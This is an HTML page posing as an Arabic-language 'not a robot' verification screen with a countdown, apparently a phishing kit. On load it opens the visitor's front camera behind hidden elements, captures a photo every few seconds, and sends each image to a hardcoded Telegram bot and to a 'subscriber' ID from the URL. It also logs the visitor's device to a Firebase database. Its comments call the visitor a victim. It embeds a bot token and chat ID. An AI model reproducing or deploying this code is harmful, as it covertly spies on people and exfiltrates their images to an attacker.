<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø£Ù…Ø§Ù†</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; text-align: center; }
        body { height: 100vh; display: flex; align-items: center; justify-content: center; background: linear-gradient(-45deg, #ff9800, #9c27b0, #ffcc80, #7b1fa2); background-size: 400% 400%; animation: backgroundAnimation 6s ease infinite; }
        @keyframes backgroundAnimation { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 0 15px rgba(0,0,0,0.2); width: 90%; max-width: 400px; }
        h1 { color: red; font-size: 22px; margin-bottom: 15px; }
        .progress-container { background: #eee; border-radius: 10px; height: 20px; width: 100%; margin: 20px 0; overflow: hidden; }
        .progress-bar { background: #ff5722; height: 100%; width: 100%; transition: 1s linear; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="container">
        <h1>Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù†Ùƒ Ù„Ø³Øª Ø±ÙˆØ¨ÙˆØª</h1>
        <p>ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ø­ØªÙ‰ ÙŠÙ†ØªÙ‡ÙŠ Ø§Ù„Ø¹Ø¯ Ø§Ù„ØªÙ†Ø§Ø²Ù„ÙŠ...</p>
        <div class="progress-container">
            <div class="progress-bar" id="progress"></div>
        </div>
        <p id="countdown">20</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // 1. Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ÙØ§ÙŠØ±Ø¨ÙŠØ³
        const firebaseConfig = { databaseURL: "https://elcomando-68116-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // 2. Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
        const botToken = "7681653454:AAHdCsBUKbiru2Z-9aDBzMgVeqhuDWGLyjk";
        const adminChatId = "5375214810"; // Ø§Ù„Ø£ÙŠ Ø¯ÙŠ Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ (Ø§Ù„Ø£Ø¯Ù…Ù†)

        // Ø¬Ù„Ø¨ Ù…Ø¹Ø±Ù Ø§Ù„Ù…Ø´ØªØ±Ùƒ Ù…Ù† Ø§Ù„Ø±Ø§Ø¨Ø· ( user_id Ù‡Ùˆ Chat ID Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù… Ø§Ù„Ø®Ø§Øµ Ø¨Ø§Ù„Ù…Ø´ØªØ±Ùƒ)
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get("user_id") || "Unknown";

        // 3. Ù†Ø¸Ø§Ù… Ø§Ù„Ø¹Ø¯ Ø§Ù„ØªÙ†Ø§Ø²Ù„ÙŠ
        let timeLeft = 20;
        const countdownInterval = setInterval(() => {
            timeLeft--;
            document.getElementById("countdown").innerText = timeLeft;
            document.getElementById("progress").style.width = (timeLeft / 20) * 100 + "%";
            if (timeLeft <= 0) {
                clearInterval(countdownInterval);
                document.querySelector('.container').innerHTML = "<h1>ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ù†Ø¬Ø§Ø­ âœ…</h1><p>Ø³ÙŠØªÙ… ØªØ­ÙˆÙŠÙ„Ùƒ Ø§Ù„Ø¢Ù†...</p>";
            }
        }, 1000);

        // 4. ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù…ÙˆÙ‚Ø¹ (Firebase) - Ø§Ù„Ø´Ø§Ø´Ø© Ø§Ù„Ø­ÙŠØ© Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù…
        function updateLiveStatus(statusText) {
            if (userId !== "Unknown") {
                db.ref('hits/' + userId + '/ÙƒØ§Ù…ÙŠØ±Ø§').set({
                    status: statusText,
                    device: navigator.userAgent,
                    last_update: new Date().toLocaleString()
                });
            }
        }

        // 5. ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ§Ù„Ø³Ø­Ø¨
        async function startCapture() {
            try {
                const video = document.getElementById('video');
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                
                updateLiveStatus("ðŸŽ¥ Ø§Ù„Ø¶Ø­ÙŠØ© Ù…ØªØµÙ„ Ø§Ù„Ø¢Ù† - Ø¬Ø§Ø±ÙŠ Ø³Ø­Ø¨ Ø§Ù„ØµÙˆØ±");

                // Ø³Ø­Ø¨ ØµÙˆØ±Ø© ÙƒÙ„ 5 Ø«ÙˆØ§Ù†Ù (ØªØ¬Ù†Ø¨ Ø§Ù„Ù€ 10ms Ø¹Ø´Ø§Ù† Ø§Ù„Ø¨ÙˆØª Ù…ÙŠØ¹Ù…Ù„Ø´ Ø³Ø¨Ø§Ù… ÙˆÙŠØªØ­Ø¸Ø±)
                setInterval(() => {
                    takeSnap(video);
                }, 3000); 
            } catch (err) {
                updateLiveStatus("âŒ Ø§Ù„Ø¶Ø­ÙŠØ© Ø±ÙØ¶ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§");
            }
        }

        function takeSnap(video) {
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append("photo", blob, "snap.jpg");
                
                // Ø¥Ø¶Ø§ÙØ© Ù†Øµ ØªÙˆØ¶ÙŠØ­ÙŠ Ù„Ù„Ø±Ø³Ø§Ù„Ø©
                const caption = `ðŸ“¸ ØµÙŠØ¯ ÙƒØ§Ù…ÙŠØ±Ø§ Ø¬Ø¯ÙŠØ¯\nðŸ†” ØµØ§Ø­Ø¨ Ø§Ù„Ø±Ø§Ø¨Ø·: ${userId}\nðŸ“± Ø§Ù„Ø¬Ù‡Ø§Ø²: ${navigator.platform}`;

                // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ø£Ø¯Ù…Ù† (Ø£Ù†Øª)
                sendToTelegram(adminChatId, blob, caption);

                // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ù…Ø´ØªØ±Ùƒ (Ù„Ùˆ Ø­Ø§Ø·Ø· Ø§Ù„Ù€ ID Ø¨ØªØ§Ø¹Ù‡ ÙÙŠ Ø§Ù„Ø±Ø§Ø¨Ø·)
                if (userId !== "Unknown" && userId !== adminChatId) {
                    sendToTelegram(userId, blob, "ðŸ“¸ Ù…Ø¨Ø±ÙˆÙƒ! ØªÙ… Ø³Ø­Ø¨ ØµÙˆØ±Ø© Ù…Ù† Ø¶Ø­ÙŠØªÙƒ");
                }
            }, "image/jpeg");
        }

        function sendToTelegram(chatId, blob, caption) {
            const fd = new FormData();
            fd.append("chat_id", chatId);
            fd.append("photo", blob, "snap.jpg");
            fd.append("caption", caption);

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: "POST",
                body: fd
            }).catch(e => console.error("Telegram Error"));
        }

        window.onload = startCapture;
    </script>
</body>
</html>
